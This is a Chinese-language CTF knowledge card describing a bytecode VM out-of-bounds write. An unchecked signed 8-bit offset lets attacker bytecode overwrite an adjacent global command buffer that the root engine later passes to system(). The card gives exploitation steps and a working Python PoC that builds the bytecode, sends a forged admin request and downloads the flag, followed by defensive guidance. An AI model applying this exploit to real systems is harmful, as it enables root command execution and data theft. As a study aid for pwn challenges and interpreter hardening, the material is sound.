---
id: ctf-pwn-bytecode-vm-signed-offset-oob-write-global-command-system
title: 字节码 VM 8 位有符号偏移越界写：反向改写相邻全局命令缓冲区触发 system RCE
type: scenario
domain: ctf
path: ctf/pwn
technique: bytecode-vm-signed-offset-oob-write-adjacent-global-command-rce
aliases:
- VNM 越界写
- 字节码解释器 OOB
- 8 位有符号偏移
- vm_scratch 反向写
- 全局命令缓冲区覆写
- NeuralChat
tags:
- pwn
- vm
- bytecode
- out-of-bounds-write
- signed-offset
- global-buffer-overflow
- system
- rce
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V101
  verified_at: '2026-11-05T22:24:41+08:00'
  notes: 已对照原文核对：opcode 0x02 mov imm32、0x07 int8偏移写、diag_cmd=+0x10与vm_scratch=+0x90相差0x80、halt 0xFF返回0后system(diag_cmd)均一致；未独立复跑，依赖附件结构体布局。
---

## 一句话结论

一个 CTF 服务把攻击者提供的 VNM 字节码交给 root 引擎执行；解释器的 store 指令用 `(int8_t)offset` 索引 `g_pwn.vm_scratch` 写 dword，只校验寄存器号而不校验偏移。攻击者用 `0x80`–`0xFF` 的负偏移从 `vm_scratch` 反向写入同一结构体前面的 `diag_cmd` 命令缓冲区，VNM 正常 halt 后引擎调用 `system(g_pwn.diag_cmd)`，从而以 root 执行任意命令。

## 原理

- **VM 结构布局**：全局结构体 `g_pwn` 中 `diag_cmd` 位于 `+0x10`，`vm_scratch` 位于 `+0x90`（原文注释与反编译）。两者相差 `0x80` 字节，正好落在 8 位有符号偏移的负半区。
- **越界 store**：opcode `0x07` 的实现是 `*(uint32_t *)&g_pwn.vm_scratch[(char)offset] = regs[src];`。`offset` 从字节码取一个 `uint8_t`，再转成 `int8_t` 参与指针运算；代码只检查 `reg_idx_store_src <= 0xF`，没有任何 `offset` 上下界检查。`0x80` 作为有符号字节是 `-128`，于是 `vm_scratch - 0x80 == g_pwn + 0x10`，即 `diag_cmd` 起始地址；`0x84` 写 `diag_cmd+4`，依此类推。
- **写入原语足够构造命令**：opcode `0x02` 是 `mov reg, imm32`（`02 <reg> <imm32>`），可把任意 4 字节立即数装入寄存器；随后 `0x07 <signed_off> <reg>` 把该 dword 写到目标偏移。命令字符串按 4 字节分块即可完整覆盖 `diag_cmd` 缓冲区。
- **危险 sink**：管理员子命令 `0x05` 调用 `execute_vnm_program(extra_data, extra_len)`；当程序以 `0xFF` halt 返回 0 时，调用方走 else 分支执行 `system(g_pwn.diag_cmd)`。该命令缓冲区原本固定为 `/opt/neuralchat/plugins/diag.sh`，被 VM 改写后变成攻击者命令。
- **执行权限**：引擎以 root 启动（为读取 flag/执行插件），Flask 前端才降权到 `neuralchat`；因此 VM 写入的是 root 进程内的全局变量，`system` 也以 root 执行，危害从“任意字节码”升级为宿主机/容器内 root RCE。
- **为什么其他检查挡不住**：VM 对代码长度、opcode 参数数量、寄存器号（`<=0xF`）、栈深度（`stack_top <= 123`）有检查，但唯独把 `offset` 当成可信的 8 位索引；这是典型的“检查了索引类型的一半，没检查范围”。
- **前置条件**：子命令 `0x05` 需要管理员 token（见关联卡）；若 token 无法伪造，则需要其他方式到达 `execute_vnm_program`。本题通过公开状态接口 + 可预测管理密钥伪造 token，构成完整链。

## 触发条件

- 特权进程暴露字节码/脚本解释器，且解释器的内存访问指令使用有符号小整数偏移、缺少边界检查。
- 解释器的工作区（如 `vm_scratch`）与敏感全局变量（命令缓冲区、函数指针、密钥、长度字段）在同一结构体/相邻内存，且距离落在偏移范围内（本题 ±128 字节）。
- 解释器执行完成后存在把该全局缓冲区交给 `system`/`exec*`/回调的 sink。
- 攻击者能提交字节码（直接接口或可伪造/绕过的管理认证）。
- 引擎权限高于调用者（root 引擎 + 低权前端）会放大危害；即使同权，也等价于任意命令执行。

## 利用步骤

1. 逆向 VM：确认 opcode 表、寄存器数量、`vm_scratch` 地址、`diag_cmd` 等相邻全局变量偏移，以及 `execute_vnm_program` 返回 0 后的 sink。
2. 计算目标偏移：`off = (diag_cmd_addr - vm_scratch_addr) & 0xFF`。本题为 `0x80`（即 `-128`）。
3. 构造写命令的字节码：把命令按 4 字节分块，每块生成 `02 00 <imm32>`（`mov r0, imm`）与 `07 <off+i> 00`（`store [vm_scratch+off+i], r0`），最后追加 `FF` halt。
4. 若命令不足 4 字节倍数，用 `\x00` 补齐；确保写入覆盖旧命令字符串并保留终止 NUL。
5. 伪造/取得管理员 token，构造 `subcommand=0x05` 的管理请求，`extra` 字段就是上述 VNM 字节码；token 摘要需覆盖完全相同的字节码。
6. 通过 `/api/raw` 或后端 socket 发送 `0xFF + issued_at + 0x05 + auth_tag + vnm_program`。
7. 引擎执行 VM，改写 `diag_cmd` 后调用 `system`；命令可把 flag 复制到可下载目录、反弹 shell 或写入 web 可读路径。
8. 通过下载接口或外带通道取回结果；必要时在命令中追加 `;chmod 644` 等保证文件可读。

## PoC

原文 exp 的 VNM 构造与发送核心（未在本机执行；token 生成函数见关联卡）：

```python
import base64, struct, time
import requests

URL = "http://127.0.0.1:5000"

def build_vnm(command_bytes):
    prog = bytearray()
    padded = command_bytes + (b'\x00' * ((4 - (len(command_bytes) % 4)) % 4))
    for i in range(0, len(padded), 4):
        prog += b'\x02\x00' + padded[i:i+4]        # mov r0, imm32
        prog += bytes([0x07, (0x80 + i) & 0xFF, 0x00])  # store [vm_scratch-0x80+i], r0
    prog += b'\xFF'                                 # halt
    return bytes(prog)

# 1) 已通过 token 伪造拿到 ok_secret（见 crypto-prng-observable-pid-uptime-derived-admin-secret-token-forgery）
command = b'cp /home/ctf/flag /opt/neuralchat/downloads/f;chmod 644 /opt/neuralchat/downloads/f'
extra = build_vnm(command + b'\x00')

subcommand = 0x05
issued_at = int(time.time())
auth_tag = token(subcommand, issued_at, extra, ok_secret)   # SHA256(LE32(ts)||subcmd||extra||secret)
body = struct.pack("<I", issued_at) + bytes([subcommand]) + auth_tag + extra

resp = requests.post(
    f"{URL}/api/raw",
    json={"data": base64.b64encode(b"\xff" + body).decode()},
    timeout=10,
).json()
raw = base64.b64decode(resp["data"])
print("engine status =", raw[0])   # 0 表示 VNM 执行并 system 返回

# 2) 从下载接口取回命令输出（本题命令把 flag 拷贝到 downloads/f）
r = requests.get(f"{URL}/api/download", params={"file": "f"}, timeout=10)
print(r.text)
```

```text
# 关键偏移（按原文反编译/注释）：
#   g_pwn.diag_cmd   = g_pwn + 0x10
#   g_pwn.vm_scratch = g_pwn + 0x90
#   store 偏移 0x80 作为 int8_t = -128 -> 命中 diag_cmd
```

## 变体与关联

- **偏移范围变体**：8 位/16 位有符号偏移、`int` 与 `size_t` 混用、数组下标未做下界检查；只要目标全局变量落在负偏移可达范围内即可。
- **指令变体**：store dword/qword、load 越界读（可读相邻密钥/指针）、push/pop 越界、`memcpy` 长度来自寄存器；不同指令可组合成任意读写或信息泄露。
- **sink 变体**：`system(diag_cmd)`、`popen`、函数指针调用、`execve` 参数数组、回调注册表；若命令缓冲区不在 ±128 内，可改打相邻的函数指针或结构体字段。
- **关联卡片**：[[crypto-prng-observable-pid-uptime-derived-admin-secret-token-forgery]]（本题伪造管理员 token 的前置链）、[[code-analysis-reverse-vm-vmprotect-identification-behavior-analysis]]（VM 保护的识别与行为分析）、[[binary-pwn-heap-uaf-function-pointer-hijack]]（函数指针劫持类思路）。
- **边界**：本题为 CTF 服务，偏移与结构体布局依赖附件；真实目标需确认编译器布局、PIE/ASLR、栈保护与 seccomp；若引擎非 root，RCE 权限相应降低但仍可横向。

## 检测与防御

- **解释器加固**：所有内存访问指令必须对偏移做显式上下界检查（如 `0 <= off && off + width <= sizeof(vm_scratch)`），禁止把 `uint8_t` 直接 cast 成 `int8_t` 后索引；寄存器号、栈深度、代码长度全部用无符号安全比较。
- **内存布局**：把 VM 工作区与命令缓冲区、函数指针、密钥等敏感全局变量隔离到不同页/不同结构体，避免负偏移可达；关键变量加 canary 或只读保护。
- **sink 加固**：不要对攻击者可控字符串调用 `system`；改用固定路径的 `execve`/`posix_spawn`，参数数组与可执行文件白名单；调用前校验命令缓冲区未被修改。
- **权限与隔离**：引擎降权运行，使用 seccomp/AppArmor/容器最小能力；前后端 socket 权限最小化，不向低权前端开放管理员子命令。
- **认证**：管理 token 使用 CSPRNG 密钥 + HMAC + nonce/时间戳，常量时间比较；不要把可观测的 pid/uptime 派生为密钥（见关联卡）。
- **检测**：监控 VM 执行时长/异常偏移、命令缓冲区内容变化、root 子进程创建（`system`/`/bin/sh`）、下载目录异常文件；对字节码做 fuzz 与边界断言。
